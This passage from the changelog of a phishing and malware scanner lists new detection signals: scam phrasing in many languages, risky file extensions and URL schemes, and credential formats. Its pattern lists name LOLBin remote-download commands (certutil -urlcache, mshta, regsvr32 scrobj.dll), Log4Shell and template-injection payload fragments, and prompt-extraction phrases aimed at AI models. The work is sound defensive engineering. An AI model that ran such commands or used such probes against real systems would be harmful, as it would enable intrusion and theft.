  bundles carrying arbitrary executables (same delivery class as
  `.appx`/`.msi` on Windows).
- **Loyalty-points + debt-relief scam vocab** (`hlse_text.c`):
  "loyalty/reward points · points are expiring · redeem your points ·
  airline miles · frequent flyer miles · claim your points" (points/
  miles expiry phishing), plus "settle your debt · debt relief ·
  debt consolidation · eliminate/reduce your debt · fix your credit ·
  credit repair · credit score has dropped · guaranteed credit
  approval · bad credit approved" (debt-relief / credit-repair
  advance-fee fraud).
- **Media playlist/redirector carriers** (`hlse_file.c`): `.wvx`,
  `.wax`, `.m3u`, `.m3u8`, `.pls`, `.vlc` — playlists that dereference
  remote streams (documented malspam redirector class).
- **P2P-payment + marketplace-scam vocab** (`hlse_text.c`):
  "zelle/venmo/cashapp transfer|payment · pay through/via zelle ·
  interested in your item · item on marketplace · marketplace
  listing · facebook marketplace · craigslist · deposit to hold ·
  hold the item · send the deposit · courier will pick up · is it
  still available" — P2P transfer-notification lures and the
  deposit-to-hold / overpayment marketplace scam.
- **`.ipsw` + `.sparsebundle`** (`hlse_file.c`): iOS restore image
  (forced-downgrade / profile-injection carrier) and macOS
  disk-image bundle (same risk class as `.dmg`).
- **Rebate + romance-scam vocab** (`hlse_text.c`): "energy rebate ·
  utility rebate · tax rebate · stimulus rebate · rebate check ·
  claim your rebate · rebate program" (utility/tax rebate phishing —
  a major consumer-fraud category), plus romance-scam openings and
  the pig-butchering channel-move: "felt a connection · found/saw
  your profile · looking for love · lonely widow/er · god fearing ·
  distance means nothing · move to / chat on / talk on / continue on
  whatsapp|telegram".
- **Emergency-money + audit/KYC scam vocab** (`hlse_text.c`):
  "i am in trouble · need money urgently · send money now · emergency
  cash · wire me money · stuck abroad · lost my wallet abroad" (the
  grandparent/bail-money scam family), plus "compliance audit · audit
  findings · vulnerability assessment · penetration test report"
  (fake security-vendor bait) and "video identification · video
  verification · verify via video" (deepfake-KYC lures).
- **`.diagpkg`, `.jnlp`, `.xaml`** (`hlse_file.c`): diagnostics
  package sibling of `.diagcab`, Java Web Start remote-jar launch
  descriptor, and XAML markup carrying ObjectDataProvider code
  execution.
- **`wyciwyg:` + `local:` URL schemes** (`hlse_core.c`): Firefox
  what-you-cache origin bypass and local-file references.
- **Payroll-diversion + recruitment-scam vocab** (`hlse_text.c`):
  "direct deposit · payroll deposit · change of bank account · bank
  details have changed · update your bank details" (HR-targeted salary
  redirection BEC), plus "been shortlisted · complete the assessment ·
  assessment link · skills assessment · interview assessment ·
  pre-employment screening · onboarding paperwork · job offer letter"
  (fake-recruitment malware delivery — a real state-actor vector).
- **`fsq3` Foursquare Places API key** (`hlse_secrets.c`).
- **HD-wallet + mail/lake credentials** (`hlse_secrets.c`): `xprv` /
  `xpub` Bitcoin HD-wallet extended keys (the master private key hands
  over the entire wallet; the public key exposes every derived
  address), Mailgun `key-` + 32 hex API keys, and Databricks `dapi` +
  32 hex personal access tokens.
- **Government-benefit / pharma / charity-scam vocab** (`hlse_text.c`):
  "snap benefits · ebt card · food stamps · student loan forgiveness ·
  loan forgiveness approved · unemployment benefits · benefits direct
  deposit · claim your benefits · benefit payment" (benefit-lock and
  forgiveness lures), "no prescription needed/required · cheap
  medications · discount pharmacy · online pharmacy · order
  medications" (pharma spam), and "donate now to help · donate to /
  help the victims · disaster relief fund · urgent donation" (fake
  disaster-relief appeals).
- **`.diagcab` extension flag** (`hlse_file.c`): Windows diagnostics
  cabinet — launches msdiag.exe troubleshooters that can stage
  arbitrary executables (real malspam carrier).
- **Sextortion phrase variants + mule-recruitment vocab**
  (`hlse_text.c`): "i have a recording of you · recording of you ·
  private video of you · your private video · watching adult sites ·
  send to all contacts · to all contacts" (campaign-specific wording
  variants of the existing sextortion list) plus financial-agent
  mule recruitment "payment processing agent · payments on our
  behalf · process payments on behalf · financial agent · transfer
  agent position · regional representative needed · cashier
  position from home".
- **`.prf` extension flag** (`hlse_file.c`): Outlook profile file —
  importing one silently registers attacker-controlled mail
  accounts/servers.
- **`windowsdefender:` handler scheme** (`hlse_core.c`): Defender
  app deep link, grouped with the other app-launch handlers.
- **Domain-expiry inflections + procurement bait** (`hlse_text.c`):
  "domain name will expire / domain name expires / search engine
  registration / domain listing" (SEO-renewal scam variants of the
  existing domain-expiry list) plus "purchase order attached · po
  attached · new order attached · request for quotation · rfq
  attached · quotation attached · proforma invoice · signed po" —
  the highest-volume business-malspam shape after fake invoices.
- **419 proof-of-payment + fee-ladder vocab** (`hlse_text.c`):
  "swift copy · mt103 · payment advice · payment slip attached"
  (fake SWIFT-payment bait), "compensation fund · compensated with ·
  un/united nations compensation" (UN-compensation boilerplate),
  "your atm card · atm card package/worth" (ATM-card consignment
  lure), and the fee ladder "activation fee · insurance fee ·
  delivery fee · coverage for your consignment".
- **`rk_test_` Stripe restricted test key** (`hlse_secrets.c`) —
  completes the Stripe family (sk/rk/pk × live/test + whsec_).
- **Pig-butchering + BEC-coaching vocab** (`hlse_text.c`):
  "guaranteed daily · daily returns · profit every day · withdrawal
  requires · fee to withdraw · unfreeze your account · unlock your
  profits" (investment-scam funnel) plus secrecy/coaching scripts
  "between you and me · strictly between us · keep this transaction
  confidential · if anyone asks · do not tell your bank · tell them
  it's for · do not discuss this transaction" — the pre-scripted
  cover story a BEC fraudster feeds the victim.
- **Remote-access + overcharge-refund lures** (`hlse_text.c`):
  "our technician · technician will connect · remote access to fix ·
  grant/allow remote access · download/install anydesk · teamviewer ·
  quickassist" (the tech-support scam's remote-access leg) plus
  "you have been overcharged · refund will be issued · process/claim
  your refund · entitled to a refund" (the overcharge-refund
  narrative that follows it).
- **`.udl` extension flag** (`hlse_file.c`): Microsoft OLE DB Data
  Link — double-click opens a connection-string dialog able to reach
  remote SMB/NTLM endpoints (credential-relay lure).
- **Renewal/refund-scam + notification-spam lures** (`hlse_text.c`):
  "subscription will renew · auto-renewed · renewal charge · antivirus
  subscription · geek squad · cancel this order · call to cancel" —
  the fake-invoice/callback-refund family — plus "click allow ·
  tap allow to confirm" browser-notification-spam bot-check bait.
- **Chinese cloud credential formats** (`hlse_secrets.c`): `LTAI`
  (Alibaba Cloud AccessKey ID) and `AKID` (Tencent Cloud SecretId) —
  same blast radius as the existing AWS `AKIA` rows.
- **`.appinstaller` extension flag** (`hlse_file.c`): unconditional LOG
  on the MSIX URI-handler manifest (previously only remote-Uri content
  was gated; the bare extension itself is the CVE-2021-43890 carrier).
- **Quarantine-release + unsolicited-code lures** (`hlse_text.c`):
  "quarantined messages/emails · messages in quarantine · quarantine
  digest · release the message · review quarantined" — the top O365
  credential-phish frame — plus "did not request this code · login code
  was requested · ignore if not you" (panic-sign-in bait).
- **Font-file carriers** (`hlse_file.c`): `.fon` `.fnt` `.pfa` `.pfb`
  `.bdf` `.pcf` `.snf` — parse-on-preview Windows bitmap/Type-1/X11
  bitmap fonts in the same family as the existing `.cur`/`.ani` cursor
  payloads.
- **`NRAI-` / `NRAL-` secret prefixes** (`hlse_secrets.c`): New Relic
  Insights query key and license key (uppercase; the lowercase `nrai-`/
  `nrak-` forms are not real formats).
- **Travel-disruption + breach-notification lures**
  (`hlse_text.c`): "flight has been cancelled / rebook" (card
  harvest) and "involved in a data breach / unusual activity on
  your account / suspicious activity" (cred-reset funnels).
- **Legal-pressure lures** (`hlse_text.c`): "court summons /
  been served / subpoena / legal complaint / filed against you /
  notice to appear / pending lawsuit" — the highest open-rate
  malspam category.
- **`.osa` / `.fpkg`** (`hlse_file.c`): compiled AppleScript
  (osascript) and the macOS flat-package installer variant.
- **Streaming scheme variants** (`hlse_core.c`): `mmsh:`
  (mms-over-http), `rtmpe:`, `rtmpt:`, `rtmte:`, `rtmfp:`.
- **Password-expiry phish** (`hlse_text.c`): "password will expire /
  password expires / keep your current password" — the classic
  cred-harvest frame.
- **Podcast subscription schemes** (`hlse_core.c`): `pcast:`,
  `itms-pcast:`, `podcast:`, `castro:`, `overcast:`, `pktc:` — a
  click subscribes the reader to a remote feed (ongoing
  remote-content pull).
- **BEC payment-diversion wording** (`hlse_text.c`): "wire
  transfer / wire instructions / ach transfer / payment
  instructions / new account number / bank account has changed /
  remit payment / divert or redirect the payment / urgent wire" —
  supplier-impersonation payout redirect shapes. ('URGENT wire
  transfer now' now triggers the full BEC advisory.)
- **InfoPath / OneNote / RDM carriers** (`hlse_file.c`): `.xsn`/
  `.xsf` form templates (script + external data connections),
  `.onepkg` packaged OneNote, `.rdg` remote-desktop session lists.

- **Shared-document / e-sign / fax lures** (`hlse_text.c`): "shared
  a document with you" (the dominant OneDrive/Docs/Dropbox share
  bait), "docusign envelope / ready for signature / review and
  sign", and "incoming fax / fax transmission / efax".
- **App-store + editor deep-links** (`hlse_core.c`): `itms-apps:`,
  `itms-appss:`, `macappstore:`, `zoomphonecall:`, `confinstall:`,
  `subl:`, `mvim:`, `txmt:`, `fork:`, `sourcetree:`.
- **Unsubscribe-bait + final-warning lures** (`hlse_text.c`):
  "click to unsubscribe / stop these emails" (the click is the
  attack) plus "final warning / last warning / last notice /
  before suspension" urgency variants.
- **Windows Contacts + update carriers** (`hlse_file.c`):
  `.contact`/`.group` resolve IconPaths over UNC (credential-leak
  class), `.desklink` launcher sibling, `.msu` wusa.exe packages.
- **Account-limit + fake-invoice lures** (`hlse_text.c`): "account
  has been limited / deactivated / restricted" and "attached
  invoice / receipt for payment / unpaid, outstanding or overdue
  invoice" — the dominant malspam and billing-bait framings;
  single hits stay in OK so 'please find attached' mail is clean.
- **Package-install + meeting schemes** (`hlse_core.c`): `apt:`,
  `deb:` (open the system package manager with an install offer),
  `wbx:` (WebEx alias).
- **KYC / declined-payment lures** (`hlse_text.c`): "kyc verification
  failed / complete your kyc / resubmit your documents" (exchange
  credential harvesting) and "payment was declined / declined on
  your card / update billing details" (card phishing shape).
- **Web-shell carrier extensions** (`hlse_file.c`): `.jspf .ashx
  .asmx .svc .war .cgi .cfm .cfc .cfr .do .action .wsgi` — IIS
  handler/service extensions (the ASP.NET web-shell shapes beside
  .aspx), JSP fragments, Java web archives, CGI/WSGI gateway
  entries, ColdFusion, and Struts mappings.
- **`resource:` scheme** (`hlse_core.c`): Firefox internal-file
  disclosure via a clickable link.
- **SIM-swap / device-alert lures** (`hlse_text.c`): "number will be
  ported", "sim will be deactivated", "re-registration", "mailbox
  is almost full", "a new device signed in … from", "unfamiliar /
  unrecognized device" — takeover-notification phishing shapes.
- **`.jtd` / `.jtt`** (`hlse_file.c`): Ichitaro documents — the
  dominant JP-targeted APT carrier class.
- **Messenger deep-links** (`hlse_core.c`): `threema:`, `signal:`,
  `line:`, `kakaotalk:`, `viber:`, `wechat:`, `whatsapp:`, `wtai:`.
  ODF docs (.odt/.ott/…) stay unflagged by design — macro-capable
  but the everyday benign-doc class (same policy as .docx).
- **Voicemail / health-scam lures** (`hlse_text.c`): "new voicemail /
  missed calls / voice message waiting / click to listen" (vishing
  delivery) plus "health insurance claim / medical alert device /
  medicare benefits / coverage is expiring" (elder-targeted
  insurance phishing).
- **`.cur` / `.ani`** (`hlse_file.c`): cursor payloads parsed by the
  shell on preview (historic ANIH exploit class).
- **`SK`+32-hex Twilio API key** (`hlse_secrets.c`, hex-lower
  predicate keeps prose "SK patterns" clean).
- **Streaming/voice schemes** (`hlse_core.c`): `news:` (legacy
  NNTP alias), `rtmps:` (TLS rtmp), `mumble:`, `ts3server:`.
- **Arabic / Hindi smishing signals** (`hlse_text.c`): AR (`طردك
  محتجز في الجمارك`, `تم حظر حسابك`, `دفع الرسوم`) and HI
  (`आपका पैकेज कस्टम्स में रुका`, `खाता ब्लॉक`, `शुल्क का भुगतान`)
  — MENA + India parcel/customs and bank-lock kits; 18 languages
  covered total.
- **Storage-quota scam vocabulary** (`hlse_text.c`): "storage is
  full / almost full / nearly full", "storage quota exceeded",
  "buy more storage", "icloud/google drive storage" — the fake
  capacity-upgrade prompt that harvests card-on-file details.
- **Pre-web legacy schemes** (`hlse_core.c`): `wais:`,
  `prospero:`, `acap:`.
- **`CFPAT-` Contentful PAT** (`hlse_secrets.c`).
- **97-2003 macro carriers + message containers** (`hlse_file.c`):
  `.xlm` (Excel 4.0 macro sheet — the classic macro-malware form),
  `.ppa`, `.dot`/`.xlt`/`.pot` (legacy VBA-capable templates), and
  `.eml`/`.msg` (mail-in-an-attachment carriers — the 'invoice.eml'
  phish shape).
- **Grant-scam vocabulary** (`hlse_text.c`): "government/federal
  grant", "free grant money", "processing fee to receive", "fee to
  release" — advance-fee free-money lure.
- **`tvly-` Tavily API key** (`hlse_secrets.c`).
- **NL / PL / ID-MS / Nordic smishing signals** (`hlse_text.c`):
  Dutch (`uw pakket`, `invoerrechten`, `douane`, `rekening
  geblokkeerd`), Polish (`paczka zatrzymana`, `opłata celna`,
  `konto zablokowane`), Indonesian+Malay (`paket tertahan`,
  `bea cukai`/`kastam`, `akun diblokir`), and a shared Nordic
  (da/nb/sv) list (`din pakke`, `tolden`/`tullen`, `konto
  blokeret`, PostNord/Posten lures) — 16 languages covered total.
- **Legacy Office carriers** (`hlse_file.c`): `.xla` (97-2003 Excel
  VBA add-in), `.ade`/`.adp` (compiled Access projects).
- **Decentralized/P2P fetch schemes** (`hlse_core.c`): `ipfs:`,
  `ipns:`, `magnet:`, `ed2k:` — gateway-resolved or P2P payload
  fetches (ipfs:// is a real phishing-hosting channel; the CID
  hides the origin).
- **`.vdi` / `.ocx` / `.mst`** (`hlse_file.c`): VirtualBox disk
  (mount-and-run class), ActiveX COM object, MSI transform.
- **`xaai-` / `waka_` / `pd_oauth_`** (`hlse_secrets.c`): Axiom API,
  WakaTime, PagerDuty OAuth token forms.
- **Recovery-scam + reshipping-mule vocabulary** (`hlse_text.c`):
  "recover your lost / lost bitcoin / lost crypto / fund recovery
  service / recovery agent" (advance-fee recovery fraud) and
  "reshipping packages / receive and reship" (parcel-mule
  recruitment) in FIN_ACTION.
- **Fake-CAPTCHA ClickFix framing** (`hlse_text.c`): the "verify you
  are human" / "not a robot" / "complete the captcha" lure wrapper
  now triggers CLICKFIX so the existing amplifiers fire —
  captcha-frame + run-dialog ("windows key" added as a rundialog
  marker) reaches ISOLATE; bare Win+R stays clean (dual-use).
- **`.flatpakref` / `.deploy`** (`hlse_file.c`): Flatpak install
  reference and ClickOnce `.deploy` manifest pointer.
- **`re_` Resend API key** (`hlse_secrets.c`).
- **UK/AU/CA agency impersonation** (`hlse_text.c`): AUTHORITY gains
  HMRC / "the ato" / "the cra" / council-tax / unpaid-taxes /
  national-insurance-number phrasing — the English-speaking tax-scam
  trio beyond US IRS/SSN (HMRC refund + CRA/ATO audit smishing).
- **Browser-launch URI schemes** (`hlse_core.c`): `firefox:`,
  `safari:`, `safari-http(s):`, `googlechrome(s):`,
  `comgooglechrome:`(+x-callback), `opera-http(s):`,
  `microsoft-edge:` — a click hands the URI to another browser's URL
  handler verbatim (app-link/callback class).
- **Design-tool / OAuth token forms** (`hlse_secrets.c`): `figd_`
  (Figma PAT) and `lin_oauth_` (Linear OAuth).
- **`.provisioningprofile`** (`hlse_file.c`): Apple enterprise/ad-hoc
  sideload signing carrier (.mobileconfig stays content-gated —
  wifi profiles benign, root-CA/vpn payloads flag).
- **Web3 drainer signature verbs** (`hlse_text.c`): FIN_ACTION gains
  the decisive drain calls ("set approval for all", "approve
  unlimited", "increase/unlimited allowance", "sign this/the
  transaction", "sign this/the message to verify", "verify/prove
  wallet ownership"); BAIT gains the lure half ("claim your
  airdrop/tokens", "bridge/sync/migrate/rectify your wallet"). The
  signature verbs score at LOG alone and ALERT when compounded.
- **Android bundle carriers** (`hlse_file.c`): `.xapk`/`.apks`/
  `.apkm` — split-APK package sets in the same sideload class as
  `.apk` (already 35).
- **App-package / VM-image carriers** (`hlse_file.c`): `.appx`/
  `.appxbundle`/`.msix`/`.msixbundle` (MSIX/AppX sideload — the
  CVE-2021-43890 AppX signature-spoof chain used by Emotet/
  BazarLoader installers) and `.ova`/`.ovf`/`.wim` (VM appliance /
  disk-image carriers, same mount-and-run class as .vhd/.iso).
- **Payment token formats** (`hlse_secrets.c`): `AQEx`/`AQEy` Adyen
  API keys and bare `live_`/`test_` Mollie keys (30+ suffix keeps
  `live_show`/`test_results` prose clean).
- **ClickFix/ConsoleFix imperative forms** (`hlse_text.c`
  CLICKFIX_WORDS): "paste the command", "copy this/the command",
  "copy and paste this/the command", "paste into/in the console",
  "paste into your browser console", "paste this/it into", "run
  this/the following command", "run this in your terminal", "open
  a terminal and paste", "open powershell and" — the
  paste-into-Run/paste-into-console imperative chain that drives
  ClickFix and self-XSS lures. Bare Win+R stays excluded as
  dual-use.
- **Hangul Word Processor carriers** (`hlse_file.c`): `.hwp`/`.hwpx`
  — OLE/BAT-embedded script format used heavily in KR-targeted
  lure documents.
- **419 consignment/refund/tech-support vocab** (`hlse_text.c`):
  PRIZE gains the diplomatic-pouch family ("consignment box",
  "trunk box", "diplomatic consignment/courier/agent", "abandoned
  shipment/consignment", "release fee", "demurrage fee", "customs
  clearance fee", "insurance certificate fee") plus pious
  salutations ("dear beloved", "god fearing", "dying widow",
  "i am a barrister/diplomat"); BAIT gains refund-department
  impersonation compounds ("refund department", "process your
  refund", "unclaimed/owed/outstanding refund"); FAKE_ALERT gains
  fake-lock + call-brand forms ("your computer/browser/device has
  been locked", "call microsoft/apple", "call the number
  displayed/shown/on your screen").
- **Token formats** (`hlse_secrets.c`): `sq0idp-` Square OAuth,
  `access_token$production$`/`access_token$sandbox$` Braintree/
  PayPal Checkout (`$`-separated literal form), `dt0s01.` Dynatrace
  ingest token. `hf_` Hugging Face predicate fixed from `is_alpha`
  to `is_alnum_or_dash` — real tokens carry digits and were silently
  dropped.
- **Alternate-shell + MIME-HTML carriers** (`hlse_file.c`
  `EXECUTABLE_EXTS`): `.zsh`/`.fish`/`.nu` (zsh/fish/nushell scripts
  — same execute-on-open class as `.sh`/`.bash`) and
  `.mht`/`.mhtml` (MIME-HTML saved pages — bundled scripts execute
  in IE-mode/legacy Edge; documented mail-borne lure format).
- **ITS/CHM help-protocol URI schemes** (`hlse_core.c`
  `URL_HANDLER_SCHEMES`): `ms-its:`/`ms-itss:`/`its:`/`itsfile:`/
  `mk:` (the `@MSITStore` moniker)/`mhtml:`/`ms-help:` — compiled-
  help content carries executable script and these handler forms
  bypass host parsing entirely; `mk:` with a remote indicator scores
  BLOCK. `hcp:`/`res:` were already covered.
- **Shortcut script-scheme payloads** (`hlse_file.c`
  `launcher_payload_score`): a `.url`/`webloc` whose `URL=` value is
  `javascript:`/`vbscript:`/`jscript:`/`data:text/html`/ITS/`mhtml:`
  is a direct execution primitive that bypassed the http(s)-only
  link extraction — now scores 65+. A benign `https:` `.url` stays
  LOG.
- **IaC / CI-CD token formats** (`hlse_secrets.c`): `pul-` Pulumi
  access token (43-char suffix), `ccipat_` CircleCI personal API
  token (40-hex suffix), `pscale_tkn_`/`pscale_pw_` PlanetScale
  service token + branch password. All were silent-miss; the IaC
  supply-chain class (terraform already covered via `atlasv1.`) now
  includes the three most-leaked CI-adjacent credential families.
- **Sextortion pronoun/passive variants** (`hlse_text.c` RANSOM):
  campaigns swap "i" for "we" and contacts for family/friends —
  "we installed/recorded/have footage", "we/i know your password"
  (the proof-of-breach signature line), passive distribution
  ("sent to all your contacts", "be shared with your
  family/friends"), "to all your friends", "shared with your
  family". Benign "sent to all addresses"/"shared with your team"
  stay OK — the passive forms are scoped to contact-object phrases.
- **Wallet-drain imperative forms** (`hlse_text.c` FIN_ACTION):
  "restore/validate/import/reactivate your wallet", "wallet
  verification/validation", "enter your phrase" — the noun-only
  list missed drainer landing-page verbs; a bare "recovery phrase"
  doc mention stays OK.
- **Prompt-extraction probes in text** (`hlse_text.c`): new
  `PROMPT_EXTRACT` signal — the reconnaissance step before an
  injection: "reveal/show/print/repeat your system prompt",
  "repeat the words above", "what are/were your instructions",
  "dump/leak/echo your prompt", "your hidden/secret/initial prompt",
  "your system message". Distinct from PROMPT_OVERRIDE (which
  replaces instructions); →45+10/cap60. Benign "describe your role"
  and "summarize the above" stay OK.
- **TLS-wrapped legacy schemes** (`hlse_core.c`): `ftps:`/`snews:`/
  `nntps:` joined URL_LEGACY_SCHEMES — `ldaps:` was listed while its
  ftp/nntp siblings fell through to OK; one table feeds both the
  dispatcher and the scorer.
- **`.accda` compiled Access add-in** (`hlse_file.c`): same
  VBA/autoexec surface as .accde/.mdb/.accdb →30. (`.laccdb` is a
  transient lock record, not a carrier — deliberately unlisted.)
- **LOLBin download/exec primitives in text** (`hlse_text.c`): new
  `LOLBIN` signal — flag forms whose only purpose is fetching or
  executing remote payloads: `certutil -urlcache`/`-split`, `bitsadmin
  /transfer`, `mshta http|javascript|vbscript`, `regsvr32 /i:` +
  `scrobj.dll` (Squiblydoo), `msiexec /i http` (remote MSI),
  `wmic process call create`, `powershell|pwsh -enc`/
  `-EncodedCommand`, `rundll32 javascript:`/`url.dll`, `msbuild.exe
  http`. →50+15/cap70 (single hit ALERT, combined with a URL the
  other signals lift it to BLOCK/ISOLATE). Benign `certutil
  -encode`/`-verifyctl`, `schtasks`, and narrative mentions stay OK.
- **Dev-platform / mapping secret formats** (`hlse_secrets.c`):
  Mapbox `sk.eyJ`/`pk.eyJ` (base64url JWT segments — new
  `is_alnum_dash_dot` predicate), Grafana `glsa_` service accounts,
  Supabase `sbp_` service-role keys (bypass all RLS), Render `rnd_`,
  Okta OAuth `xoa.` — each previously scored OK on a live credential.
- **E7 duplicate-`From:` detection** (`hlse_secrets.c` email
  forensics): multiple `From:` headers violate RFC 5322 §3.6 and are
  a parser-confusion primitive — gateway verifies one, client
  displays the other. +35.
- **freedesktop/KDE remote-icon leak** (`hlse_file.c`):
  `unc_leak_score` now recognises `[Desktop Entry]` and `icon=`
  carriers — a `.directory` or `.desktop` whose `Icon=`/`Exec=`
  points at `\\host\share` leaks NetNTLM on folder view, same class
  as desktop.ini/.scf. Local icon paths stay clean.
- **Server-side exploit payloads in text** (`hlse_text.c`): two new
  signals — `EXPLOIT_LOOKUP` (`${jndi:` Log4Shell primitive across
  ldap/rmi/dns/nis subschemes, `#{T(`/`${T(` Spring-EL class refs)
  →60+15/cap75 BLOCK, and `SSTI_CHAIN` (Jinja2/Twig/EL dunder escape
  chains `.__class__`/`__mro__`/`__subclasses__`/`.__globals__`/
  `config.items()`, canonical probe `{{7*7}}`, `${ifs}` bash
  whitespace bypass, `<%= system`/`runtime` ERB exec,
  `request.application`) →35+10/cap60. Pasted exploit text is itself
  the threat these engines guard; benign `${var}`/`{{name}}`
  templates and `__init__` mentions stay OK.
- **Scheme-relative open-redirect targets** (`hlse_core.c`): the
  open-redirect check required an absolute `http(s)://` value, so
  `?redir=//evil.com` (and its `%2f%2f`-encoded form) rode the outer
  page's scheme to a foreign host unscored — the classic
  google.com/url-style laundering shape. `//host` and `%2f%2fhost`
  values now take the same cross-host comparison; same-host and
  non-redirect-param `//` values stay OK.
- **Chromium-derived browser-internal schemes** (`hlse_core.c`):
  `edge:`/`opera:`/`brave:`/`vivaldi:`/`yandex:` joined the URL-wrapper
  table — `chrome:`/`about:`/`moz-extension:`/`chrome-extension:`
  already scored 35/40 but the major derivative browsers' internal
  schemes fell through to OK despite being the same internal-page /
  extension-surface class. Registered in both the scoring table and
  the `hlse_scan` dispatcher (the two must stay in sync).
- **Remaining payment/dev-tool secret formats** (`hlse_secrets.c`):
  Razorpay `rzp_live_`/`rzp_test_` (IN's dominant gateway), Mercado
  Pago `APP_USR-` (LATAM's dominant), Flutterwave `FLWSECK-`/`FLWPUBK-`
  (Africa's dominant), Shippo `shippo_live_`/`shippo_test_`, Heroku
  legacy `HRKU-` UUID-form key, NuGet `oy2` + 43 base62 — each
  previously scored OK on a live credential.
- **VSTO/Access carriers** (`hlse_file.c`): `.vsto` (ClickOnce
  installs a managed Office add-in on open) and `.accde`
  (compiled-locked Access DB, VBA+autoexec like .mdb/.accdb) →30.
- **`file` subcommand scans content for live credentials**
  (`hlse_cli.c`): the `scan`/daemon paths run their own secrets
  pass, but `hlse_core file <path>` analyzed only the name and
  magic bytes — a file carrying a live `AKIA…`/`ghp_…`/PEM key
  scored OK. The `file` handler now runs `hlse_scan_secrets` over
  the head block and folds the verdict in (→ISOLATE on a live key).
  The pass lives in the CLI layer so `scan`/daemon paths do not
  double-count.
- **Italian / Turkish / Thai / Vietnamese smishing vocabulary**
  (`hlse_text.c` IT_SMISH, TR_SMISH, TH_SMISH, VN_SMISH): Poste
  Italiane pacco/giacenza and Agenzia delle Entrate rimborso kits;
  Turkish kargo/gümrük courier fees, hesap-bloke locks, and
  e-Devlet/savcılık authority impersonation; Thai พัสดุ courier and
  บัญชีถูกระงับ bank lures; Vietnamese gói hàng parcel and
  tài khoản bị khóa lures. All four previously scored fully OK
  (compound lures now →45 ALERT).
- **Korean / German / French smishing vocabulary** (`hlse_text.c`
  KR_SMISH, DE_SMISH, FR_SMISH): Korea's dominant 스미싱 families —
  택배 courier lures, 계좌동결/본인인증 account locks, 소액결제
  micropayment approvals, 금융감독원 authority impersonation, and the
  flagship 메신저 피싱 family (엄마 나야 / 번호 바뀌었어 / 돈 좀
  보내줘 / 문화상품권 gift-card demands); Germany's DHL-Paket and
  Konto-gesperrt kits (ihre sendung konnte nicht zugestellt,
  zollgebühren für, vorübergehend gesperrt, identität bestätigen);
  France's colis/douane kits (votre colis bloqué en douane, frais de
  douane, compte bloqué, remboursement/carte vitale lures). All three
  languages previously scored fully OK.
- **Chinese smishing (短信钓鱼) vocabulary** (`hlse_text.c`
  CN_SMISH): parcel-delivery failure (您的包裹/无法投递/重新派送),
  customs-duty (缴纳关税/海关放行), frozen/abnormal account
  (账户已被冻结/点击解冻/异常交易), real-name & identity expiry
  (身份信息过期/实名认证), ETC suspension (etc已停用/etc卡失效,
  plus JP ETC利用照会), loyalty-points expiry (积分清零/积分到期),
  social-insurance (医保卡异常/社保卡异常), traffic-violation
  (违章处理), and fee-shortfall (欠费补缴) lures — the
  PostalTriot-class kit family that is the world's highest-volume
  SMS-phishing vector, previously fully invisible (scored OK).
- **Legacy help/archive carriers** (`hlse_file.c`): `.hlp`
  (WinHelp — winhlp32 exploit surface), `.cab` (Windows install
  container), `.ace`/`.arj`/`.lha`/`.lzh`/`.zoo` (obsolete archives
  still used as mail-borne executable wrappers — .lzh/.lha a
  historically JP-targeted format), and `.uue` (uuencoded binary
  transport) →30.
- **Japanese special-fraud (特殊詐欺) vocabulary** (`hlse_text.c`
  EMERGENCY_SCAM): オレオレ/ore-ore, 示談金, 保釈金, 逮捕され,
  使い込んでしま, 還付金, 医療費の還付, 給付金, ATM guidance
  (atmに向か/atmにて手続き/atmで手続き/atmへ向か), and
  電話を切らないで/切らずに/電話口で誘導 — the dominant JP
  phone-scam family; refund-at-ATM and bail/settlement demands
  previously scored OK-24 (now e.g. "還付金…ATM手続き" →79 BLOCK).

### Fixed

- **`make fuzz` link failure** (`Makefile`): F58's mail-forensics
  call made `hlse_file.c` depend on `hlse_check_email_headers`;
  `tests/fuzz_file` (+ ASan variant) now links `hlse_secrets.c`.

### Added

- **PowerShell module + awk/sed script carriers** (`hlse_file.c`):
  `.psm1`/`.psd1` (PowerShell modules auto-load and execute),
  `.awk`/`.sed` (awk `system()`/`| getline`, sed `e` command
  run arbitrary shell) →30.
- **Discord bot token structural detection** (`hlse_secrets.c`):
  Discord bot tokens carry no fixed prefix — segment 1 is the
  base64 of the bot's numeric snowflake ID. The scanner now
  finds a `<20-30 b64url>.<5-8>.<25-45>` shape, decodes segment
  1, and requires an all-digit snowflake (15+ digits) — full
  bot control, previously invisible.
- **Remaining disk-image carriers** (`hlse_file.c`): `.dmg`
  (macOS — mounting runs the image's logic), `.vmdk`/`.qcow2`
  (VM), `.toast`/`.sparseimage`/`.flp`/`.ima` →30. `.iso`/
  `.img`/`.vhd`/`.vhdx` were already covered.
- **macOS script/automation carriers** (`hlse_file.c`):
  `.scpt`/`.scptd` (compiled AppleScript — runs on open),
  `.applescript`, `.osax` (Scripting Addition — legacy
  persistence slot), `.workflow`/`.wflow` (Automator action
  bundles — run their steps on double-click) →30. `.pac`
  deliberately excluded: enterprise proxy-auto-config files are
  ubiquitous and a bare DIRECT file must stay clean.
- **`.emlx` joins mail forensics** (`hlse_file.c`): the F58
  mail-carrier gate and the `.eml` carrier check now cover Apple
  Mail's single-message format too, so a spoofed-From `.emlx`
  scores like `.eml` instead of passing OK.
- **URL backslash-evasion signal** (`hlse_core.c`): a special-scheme
  URL written with `\` separators (`https:\\host`, `http:\\\\host\path`)
  is normalized for analysis and now also scored +30 — WHATWG folds
  `\` to `/`, so the written form exists only as filter evasion.
  Previously it normalized silently and scored as the bare host.
  The `\@` credential-confusion case keeps its stronger +50.
- **`.webarchive` extension** (`hlse_file.c`): Safari web archives
  (binary plist bundling full web content incl. scripts) →30, a
  macOS attachment-lure vector.
- **F58 mail-carrier forensics** (`hlse_file.c`): `hlse_check_file`
  routes the header block of `.eml`/`.msg`/`.mbox` files through
  `hlse_check_email_headers` — display-name spoofing, Reply-To
  redirects, and auth failures in a dropped mail file now score
  exactly as the `email` subcommand instead of passing as a
  harmless text file (previously a `From: "PayPal Security"
  <x@evil.example>` .eml with no links scanned OK).
- **F57 lockfile registry poisoning** (`hlse_file.c`): lockfiles
  (`package-lock.json`, `npm-shrinkwrap.json`, `yarn.lock`,
  `pnpm-lock.yaml`, `poetry.lock`, `uv.lock`, `Gemfile.lock`,
  `composer.lock`, `Cargo.lock`, `packages.lock.json`) are
  scanned for `resolved`/`source`/`remote`/`url`/`tarball`/
  `resolution`/`download` values; a URL whose host isn't the
  ecosystem's official registry or a common git forge scores
  55 (ALERT), a cleartext `http://` fetch scores 45. Basename-
  gated so non-lockfile JSON/YAML stays clean.
- **Notebook / data-connection extensions** (`hlse_file.c`):
